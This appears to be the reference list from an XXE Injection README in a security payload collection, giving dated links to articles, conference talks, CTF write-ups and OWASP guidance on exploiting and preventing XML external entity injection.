  - [Detecting and exploiting XXE in SAML Interfaces - Christian Mainka (@CheariX) - November 6, 2014](https://web.archive.org/web/20251209035938/http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)\n\
  - [Exploiting XXE in file upload functionality - Will Vandevanter (@_will_is_) - November 19, 2015](https://web.archive.org/web/20260306153214/https://blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)\n\
  - [EXPLOITING XXE WITH EXCEL - Marc Wickenden - November 12, 2018](https://web.archive.org/web/20260129040336/https://www.4armed.com/blog/exploiting-xxe-with-excel/)\n\
  - [Exploiting XXE with local DTD files - Arseniy Sharoglazov - December 12, 2018](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)\n\
  - [From blind XXE to root-level file read access - Pieter Hiele - December 12, 2018](https://web.archive.org/web/20181212171659/https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)\n\
  - [How we got read access on Google’s production servers - Detectify - April 11, 2014](https://web.archive.org/web/20230902033341/https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)\n\
  - [Impossible XXE in PHP - Aleksandr Zhurnakov - March 11, 2025](https://web.archive.org/web/20260131091306/https://swarm.ptsecurity.com/impossible-xxe-in-php/)\n\
  - [Midnight Sun CTF 2019 Quals - Rubenscube - jbz - April 6, 2019](https://web.archive.org/web/20260302041500/https://jbz.team/midnightsunctfquals2019/Rubenscube)\n\
  - [OOB XXE through SAML - Sean Melia (@seanmeals) - February 5, 2017](https://web.archive.org/web/20170205151900/https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)\n\
  - [Payloads for Cisco and Citrix - Arseniy Sharoglazov - December 13, 2018](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)\n\
  - [Pentest XXE - @phonexicum - March 9, 2020](https://web.archive.org/web/20260306152955/https://phonexicum.github.io/infosec/xxe.html)\n\
  - [Playing with Content-Type – XXE on JSON Endpoints - Antti Rantasaari - April 20, 2015](https://web.archive.org/web/20240615071332/https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)\n\
  - [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://web.archive.org/web/20240527202144/https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)\n\
  - [XML attacks - Mariusz Banach (@mgeeky) - December 21, 2017](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)\n\
  - [XML external entity (XXE) injection - PortSwigger - May 29, 2019](https://web.archive.org/web/20190529163105/https://portswigger.net/web-security/xxe)\n\
  - [XML External Entity (XXE) Processing - OWASP - December 4, 2019](https://web.archive.org/web/20160309065737/https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)\n\
  - [XML External Entity Prevention Cheat Sheet - OWASP - February 16, 2019](https://web.archive.org/web/20260306061747/https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)\n\
  - [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) - Bruno Morisson - August 14, 2015](https://web.archive.org/web/20161111162257/https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)\n\
  - [XXE in Uber to read local files - httpsonly - January 24, 2017](https://web.archive.org/web/20180701015455/https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)\n\
  - [XXE inside SVG - YEO QUAN YANG - June 22, 2016](https://web.archive.org/web/20211016174500/https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)\n\
  - [XXE payloads - Etienne Stalmans (@staaldraad) - July 7, 2016](https://gist.github.com/staaldraad/01415b990939494879b4)\n\
  - [XXE: How to become a Jedi - Yaroslav Babin - November 6, 2018](https://web.archive.org/web/20260306152956/https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf)"
_relative_path: XXE Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XXE Injection/README.md
````
